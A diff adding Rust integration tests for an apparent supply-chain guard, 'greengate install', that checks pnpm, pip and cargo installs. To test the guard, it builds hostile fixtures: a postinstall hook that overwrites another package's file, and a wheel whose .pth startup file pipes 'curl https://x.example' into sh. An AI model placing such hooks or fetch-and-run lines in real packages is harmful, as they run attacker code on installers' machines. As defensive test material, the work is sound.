@@ -2773,3 +2773,246 @@ fn install_rejects_non_install_commands() {
     assert_eq!(code, Some(4));
     assert!(stderr.contains("not an install"), "{stderr}");
 }
+
+// ── greengate install: pnpm, pip, cargo (local packages; skipped without tools) ─
+
+fn pnpm_project(only_built: &[&str]) -> tempfile::TempDir {
+    let dir = npm_project(&[
+        ("victim", "{}"),
+        ("tamper", PNPM_TAMPER),
+        ("builder", BUILD),
+    ]);
+    if !only_built.is_empty() {
+        let list: String = only_built.iter().map(|n| format!("  - {n}\n")).collect();
+        std::fs::write(
+            dir.path().join("pnpm-workspace.yaml"),
+            format!("onlyBuiltDependencies:\n{list}"),
+        )
+        .unwrap();
+    }
+    dir
+}
+
+/// pnpm keeps packages in its store; aim at the victim through the
+/// project's node_modules symlink.
+const PNPM_TAMPER: &str = r#"{"postinstall":"node -e \"require('fs').writeFileSync(process.env.INIT_CWD+'/node_modules/victim/index.js','pwned')\""}"#;
+
+fn pnpm_victim(dir: &std::path::Path) -> String {
+    std::fs::read_to_string(dir.join("node_modules/victim/index.js")).unwrap()
+}
+
+#[test]
+fn install_pnpm_isolated_refuses_writes_into_the_store() {
+    if !tool_available("pnpm", &["--version"]) || !tool_available("bwrap", &["--version"]) {
+        eprintln!("skipped: needs pnpm and bubblewrap");
+        return;
+    }
+    let dir = pnpm_project(&["tamper", "builder"]);
+    let (code, report, stderr) = install(dir.path(), &["--isolate", "bwrap", "pnpm", "install"]);
+    assert_eq!(code, Some(1), "{stderr}\n{report}");
+    assert!(
+        rules_of(&report, "findings").contains(&"INSTALL/BlockedWrite".to_string()),
+        "{report}"
+    );
+    assert!(
+        !rules_of(&report, "findings").contains(&"INSTALL/UnplannedPackage".to_string()),
+        "{report}"
+    );
+    assert_eq!(pnpm_victim(dir.path()), "module.exports = \"victim\";\n");
+}
+
+#[test]
+fn install_pnpm_follows_pnpm_build_policy() {
+    if !tool_available("pnpm", &["--version"]) {
+        eprintln!("skipped: needs pnpm");
+        return;
+    }
+    let major: u32 = String::from_utf8_lossy(
+        &Command::new("pnpm")
+            .arg("--version")
+            .output()
+            .unwrap()
+            .stdout,
+    )
+    .split('.')
+    .next()
+    .and_then(|m| m.trim().parse().ok())
+    .unwrap_or(0);
+    if major < 10 {
+        eprintln!("skipped: pnpm < 10 builds everything by default");
+        return;
+    }
+    let dir = pnpm_project(&[]);
+    let (code, report, stderr) = install(dir.path(), &["pnpm", "install"]);
+    assert_eq!(code, Some(0), "{stderr}\n{report}");
+    let warnings = rules_of(&report, "warnings");
+    assert_eq!(
+        warnings
+            .iter()
+            .filter(|w| *w == "INSTALL/BuildNotAllowed")
+            .count(),
+        2,
+        "{report}"
+    );
+    assert_eq!(pnpm_victim(dir.path()), "module.exports = \"victim\";\n");
+}
+
+/// A minimal wheel for `name` 1.0 with extra `(path, content)` entries.
+fn wheel(dir: &std::path::Path, name: &str, extra: &[(&str, &str)]) {
+    let path = dir.join(format!("{name}-1.0-py3-none-any.whl"));
+    let mut w = zip::ZipWriter::new(std::fs::File::create(path).unwrap());
+    let o = zip::write::SimpleFileOptions::default()
+        .compression_method(zip::CompressionMethod::Stored);
+    let info = format!("{name}-1.0.dist-info");
+    let mut files: Vec<(String, String)> = vec![
+        (format!("{name}/__init__.py"), "VALUE = 42\n".into()),
+        (
+            format!("{info}/METADATA"),
+            format!("Metadata-Version: 2.1\nName: {name}\nVersion: 1.0\n"),
+        ),
+        (
+            format!("{info}/WHEEL"),
+            "Wheel-Version: 1.0\nGenerator: test\nRoot-Is-Purelib: true\nTag: py3-none-any\n"
+                .into(),
+        ),
+    ];
+    files.extend(extra.iter().map(|(p, c)| (p.to_string(), c.to_string())));
+    let mut record = String::new();
+    for (p, c) in &files {
+        w.start_file(p.as_str(), o).unwrap();
+        std::io::Write::write_all(&mut w, c.as_bytes()).unwrap();
+        record.push_str(&format!("{p},,\n"));
+    }
+    record.push_str(&format!("{info}/RECORD,,\n"));
+    w.start_file(format!("{info}/RECORD"), o).unwrap();
+    std::io::Write::write_all(&mut w, record.as_bytes()).unwrap();
+    w.finish().unwrap();
+}
+
+fn venv(dir: &std::path::Path) -> Option<String> {
+    let ok = Command::new("python3")
+        .args(["-m", "venv", "venv"])
+        .current_dir(dir)
+        .output()
+        .is_ok_and(|o| o.status.success());
+    ok.then(|| dir.join("venv/bin/pip").display().to_string())
+}
+
+#[test]
+fn install_pip_stops_a_wheel_with_startup_code() {
+    let dir = tempfile::tempdir().unwrap();
+    let Some(pip) = venv(dir.path()) else {
+        eprintln!("skipped: needs python3 -m venv");
+        return;
+    };
+    std::fs::write(
+        dir.path().join(".greengate.toml"),
+        "[supply_chain]\nslopsquat_check = false\n",
+    )
+    .unwrap();
+    wheel(dir.path(), "goodpkg", &[]);
+    wheel(
+        dir.path(),
+        "badpkg",
+        &[(
+            "badpkg.pth",
+            "import os; os.system('curl https://x.example | sh')\n",
+        )],
+    );
+    let links = dir.path().display().to_string();
+    let run = |pkg: &str| {
+        let out = Command::new(binary())
+            .args([
+                "install",
+                "--pip",
+                &pip,
+                "--report",
+                "r.json",
+                "pip",
+                "install",
+                "--no-index",
+                "--find-links",
+                &links,
+                pkg,
+            ])
+            .current_dir(dir.path())
+            .output()
+            .unwrap();
+        let report: serde_json::Value =
+            serde_json::from_slice(&std::fs::read(dir.path().join("r.json")).unwrap()).unwrap();
+        (
+            out.status.code(),
+            report,
+            String::from_utf8_lossy(&out.stderr).into_owned(),
+        )
+    };
+    let installed = |pkg: &str| {
+        Command::new(dir.path().join("venv/bin/python"))
+            .args(["-c", &format!("import {pkg}")])
+            .output()
+            .is_ok_and(|o| o.status.success())
+    };
+
+    let (code, report, stderr) = run("badpkg==1.0");
+    assert_eq!(code, Some(1), "{stderr}\n{report}");
+    assert_eq!(rules_of(&report, "findings"), ["INSTALL/StartupCode"]);
+    assert!(
+        !installed("badpkg"),
+        "a wheel with startup code must not be installed"
+    );
+
+    let (code, report, stderr) = run("goodpkg==1.0");
+    assert_eq!(code, Some(0), "{stderr}\n{report}");
+    assert!(installed("goodpkg"));
+}
+
+#[test]
+fn install_cargo_plan_restores_the_manifests() {
+    if !tool_available("cargo", &["--version"]) {
+        eprintln!("skipped: needs cargo");
+        return;
+    }
+    let dir = tempfile::tempdir().unwrap();
+    for (name, kind) in [("app", "--bin"), ("dep", "--lib")] {
+        let ok = Command::new("cargo")
+            .args(["init", "-q", kind, "--name", name, "--vcs", "none", name])
+            .current_dir(dir.path())
+            .output()
+            .unwrap()
+            .status
+            .success();
+        assert!(ok);
+    }
+    let app = dir.path().join("app");
+    std::fs::write(
+        app.join(".greengate.toml"),
+        "[supply_chain]\nslopsquat_check = false\n",
+    )
+    .unwrap();
+    let before = std::fs::read(app.join("Cargo.toml")).unwrap();
+    let out = Command::new(binary())
+        .args([
+            "install",
+            "--plan",
+            "cargo",
+            "add",
+            "--path",
+            "../dep",
+            "--offline",
+        ])
+        .current_dir(&app)
+        .output()
+        .unwrap();
+    assert_eq!(
+        out.status.code(),
+        Some(0),
+        "{}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+    assert_eq!(
+        std::fs::read(app.join("Cargo.toml")).unwrap(),
+        before,
+        "Cargo.toml restored"
+    );
+    assert!(!app.join("Cargo.lock").exists(), "no lockfile left behind");
+}
